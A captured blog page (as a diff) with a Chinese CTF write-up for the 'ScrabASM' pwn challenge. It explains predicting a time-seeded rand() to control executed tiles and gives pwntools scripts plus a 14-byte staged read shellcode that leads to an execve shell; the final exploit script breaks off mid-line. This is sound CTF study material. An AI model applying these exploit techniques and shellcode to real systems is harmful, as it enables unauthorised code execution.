@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"whoamiuu.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":true,"height":300},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="ScrabASM一、题目分析查看程序，发现程序分配了一块固定地址 0x13370000 的可读可写可执行区域，还会执行这里的机器码。第一反应是构造 14 字节的 shellcode，但调试看了一下执行0x13370000时的寄存器状态根本无法构造出一个 14 字节的 shellcode，这是第一个难点。 1234567891011121314151617181920#define HAND_SIZ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF题解：ScrabASM">
+<meta property="og:url" content="http://whoamiuu.github.io/2026/02/09/2026-02-09-ScrabASM/index.html">
+<meta property="og:site_name" content="Whoamiuu&#39;s Blogs">
+<meta property="og:description" content="ScrabASM一、题目分析查看程序，发现程序分配了一块固定地址 0x13370000 的可读可写可执行区域，还会执行这里的机器码。第一反应是构造 14 字节的 shellcode，但调试看了一下执行0x13370000时的寄存器状态根本无法构造出一个 14 字节的 shellcode，这是第一个难点。 1234567891011121314151617181920#define HAND_SIZ">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-02-09-scrabASM/test.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-02-09-scrabASM/register.png">
+<meta property="og:image" content="http://whoamiuu.github.io/images/26-02-09-scrabASM/shell.png">
+<meta property="article:published_time" content="2026-02-09T08:56:00.000Z">
+<meta property="article:modified_time" content="2026-02-09T09:16:28.911Z">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="random-seed，shellcode">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://whoamiuu.github.io/images/26-02-09-scrabASM/test.png">
+
+
+<link rel="canonical" href="http://whoamiuu.github.io/2026/02/09/2026-02-09-ScrabASM/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://whoamiuu.github.io/2026/02/09/2026-02-09-ScrabASM/","path":"2026/02/09/2026-02-09-ScrabASM/","title":"CTF题解：ScrabASM"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CTF题解：ScrabASM | Whoamiuu's Blogs</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Whoamiuu's Blogs</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">二进制安全学习笔记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ScrabASM"><span class="nav-number">1.</span> <span class="nav-text">ScrabASM</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">一、题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.</span> <span class="nav-text">二、漏洞</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt=""
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2026/02/09/2026-02-09-ScrabASM/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CTF题解：ScrabASM | Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTF题解：ScrabASM
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-02-09 16:56:00 / Modified: 17:16:28" itemprop="dateCreated datePublished" datetime="2026-02-09T16:56:00+08:00">2026-02-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="ScrabASM"><a href="#ScrabASM" class="headerlink" title="ScrabASM"></a>ScrabASM</h1><h2 id="一、题目分析"><a href="#一、题目分析" class="headerlink" title="一、题目分析"></a>一、题目分析</h2><p>查看程序，发现程序分配了一块固定地址 0x13370000 的可读可写可执行区域，还会执行这里的机器码。第一反应是构造 14 字节的 shellcode，但调试看了一下执行0x13370000时的寄存器状态根本无法构造出一个 14 字节的 shellcode，这是第一个难点。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HAND_SIZE 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOARD_ADDR 0x13370000UL</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">play</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *hand)</span> &#123;</span><br><span class="line">    <span class="type">void</span> *board = mmap((<span class="type">void</span> *)BOARD_ADDR, BOARD_SIZE,</span><br><span class="line">                       PROT_READ | PROT_WRITE | PROT_EXEC,</span><br><span class="line">                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (board == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;    mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;    Playing your word...&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;    TRIPLE WORD SCORE!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(board, hand, HAND_SIZE);</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))board)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再看源码，发现程序会调用 rand() 来控制 0x13370000 区域的机器码，虽然可以通过swap再次通过 rand() 生成一个字节，但程序只会输出一次字节序列，就是我们无法知道swap的字节是什么，这是第二个难点。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">swap_tile</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *hand)</span> &#123;</span><br><span class="line">    <span class="type">char</span> line[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    Which tile? (0-%d): &quot;</span>, HAND_SIZE - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fgets(line, <span class="keyword">sizeof</span>(line), <span class="built_in">stdin</span>)) <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> idx = atoi(line);</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span> || idx &gt;= HAND_SIZE) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;    Invalid tile!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hand[idx] = rand() &amp; <span class="number">0xFF</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;    Tile swapped!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到rand()后，又出现一个想法，就是rand()生成的是伪随机数，由种子决定，能否通过覆盖种子来控制伪随机数生成？但是看遍了源码都没有找到任何有机会溢出的漏洞点。</p>
+<h2 id="二、漏洞"><a href="#二、漏洞" class="headerlink" title="二、漏洞"></a>二、漏洞</h2><p>隔了一天再看这道题，既然rand()依靠种子生成伪随机数，而种子通过当前的时间戳生成，srand(time(NULL))以秒为单位，所有只要在同一秒的时间去使用 srand(time(NULL))，生成的种子就相同，说明我们可以利用这一点在本地生成rand()伪随机数，以此推算出程序生成的伪随机数，甚至推算出需要swap多少次可以生成需要的数字。</p>
+<p>让ai写个脚本验证一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">BINARY = <span class="string">&quot;./scrabASM&quot;</span></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">libc.srand.argtypes = [ctypes.c_uint]</span><br><span class="line">libc.rand.restype = ctypes.c_int</span><br><span class="line"></span><br><span class="line">p = process(BINARY)</span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.lac.tf&#x27;, 31338)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your starting tiles:\n&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">line = p.recvline().decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取 14 个 hex</span></span><br><span class="line">hexes = re.findall(<span class="string">r&#x27;([0-9a-fA-F]&#123;2&#125;)&#x27;</span>, line)</span><br><span class="line">real = [<span class="built_in">int</span>(x,<span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> hexes[:<span class="number">14</span>]]</span><br><span class="line"></span><br><span class="line">seed = <span class="built_in">int</span>(time.time()) <span class="comment"># - 1</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line">pred = [libc.rand() &amp; <span class="number">0xFF</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;真实:&quot;</span>, <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> real))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;预测:&quot;</span>, <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> pred))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;匹配?&quot;</span>, real == pred)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>在 seed &#x3D; int(time.time()) 那里，由于远程可能会有延迟，所以远程时需要 -1 秒。</p>
+<p>很完美，本地预测随机数和程序生成的随机数一模一样，说明这个方法完全可行，只要本地生成之后的随机数，就可以反推出每个tile需要swap多少次，第一个困难已经解决。接下来，我们需要考虑这里的shellcode应该如何布置。</p>
+<p><img src="/images/26-02-09-scrabASM/test.png" alt="image-20260209162215228"></p>
+<p>这里先来看一下执行 0x13370000 时的寄存器状态</p>
+<p><img src="/images/26-02-09-scrabASM/register.png" alt="image-20260209163230746"></p>
+<p>很明显，这些寄存器状态无法直接构造 14 字节的 shellcode （execve）。但是，仔细查看源码，虽然只限制读入 14 字节的机器码，但是却分配了 0x1000 字节的可读可写可执行区域。思考：对于14字节shellcode，我们无法直接构造execve，那是否可以构造一个read，然后在此区域读取更多字节，给execve的shellcode创造足够的空间？</p>
+<p>利用当前寄存器状态，我构造了如下字节序列</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x48</span>, <span class="number">0x87</span>, <span class="number">0xfe</span>,       <span class="comment"># xchg rdi, rsi    ; rsi 已是 0x13370000</span></span><br><span class="line"><span class="number">0x6a</span>, <span class="number">0x00</span>,             <span class="comment"># push 0</span></span><br><span class="line"><span class="number">0x5f</span>,                   <span class="comment"># pop rdi          ; rdi = 0 (stdin)</span></span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>,       <span class="comment"># add rsi, rdx     ; rsi = 0x1337000e (因为 rdx=14)</span></span><br><span class="line"><span class="number">0x5a</span>,                   <span class="comment"># pop rdx          ; rdx = 栈上的大数值</span></span><br><span class="line"><span class="number">0x31</span>, <span class="number">0xc0</span>,             <span class="comment"># xor eax, eax     ; rax = 0 (read)</span></span><br><span class="line"><span class="number">0x0f</span>, <span class="number">0x05</span>              <span class="comment"># syscall          ; read(0, 0x1337000e, 大数值)</span></span><br></pre></td></tr></table></figure>
+
+<p>刚好14字节，这里利用栈上的数据（肯定远远大于14）作为 rdx，构造出一个read(0, 0x1337000e, 大数值)，并且读入的位置刚好时syscall后面，就紧接着执行第二次输入的shellcode（execve），获得shell</p>
+<p>思路如上，之后因为需要多次swap，又加了一些自动化swap脚本，然后就可以获得shell。远程连接时如果需要swap的次数太多可能会被服务器给ban了，导致执行到一半就EOF，多打几次应该就行，反正本地挺稳的。我觉得这道题是有难度的，但看解出的人很多，可能我把它想复杂了也不一定。。。</p>
+<p><img src="/images/26-02-09-scrabASM/shell.png" alt="image-20260209170155209"></p>
+<p>完整exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">libc.srand.argtypes = [ctypes.c_uint]</span><br><span class="line">libc.rand.restype = ctypes.c_int</span><br><span class="line"></span><br><span class="line">HAND_SIZE = <span class="number">14</span></span><br><span class="line">MAX_SWAP_TRIES = <span class="number">20000</span>   <span class="comment"># 防止死循环，足够大</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./scrabASM&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.lac.tf&#x27;, 31338)</span></span><br><span class="line"></span><br><span class="line">TARGET = [</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x87</span>, <span class="number">0xfe</span>,       <span class="comment"># xchg rdi, rsi    ; rsi 已是 0x13370000</span></span><br><span class="line">    <span class="number">0x6a</span>, <span class="number">0x00</span>,             <span class="comment"># push 0</span></span><br><span class="line">    <span class="number">0x5f</span>,                   <span class="comment"># pop rdi          ; rdi = 0 (stdin)</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>,       <span class="comment"># add rsi, rdx     ; rsi = 0x1337000e (因为 rdx=14)</span></span><br><span class="line">    <span class="number">0x5a</span>,                   <span class="comment"># pop rdx          ; rdx = 栈上的大数值</span></span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0xc0</span>,             <span class="comment"># xor eax, eax     ; rax = 0 (read)</span></span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x05</span>              <span class="comment"># syscall          ; read(0, 0x1337000e, 大数值)</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收初始 hand</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your starting tiles:\n&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">line = p.recvline().decode()</span><br><span class="line">hexes = re.findall(<span class="string">r&#x27;([0-9a-fA-F]&#123;2&#125;)&#x27;</span>, line) <span class="comment"># 提取 14 个 hex</span></span><br><span class="line">real = [<span class="built_in">int</span>(x,<span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> hexes[:<span class="number">14</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预测种子</span></span><br><span class="line">seed = <span class="built_in">int</span>(time.time())<span class="comment"># - 1</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line">pred = [libc.rand() 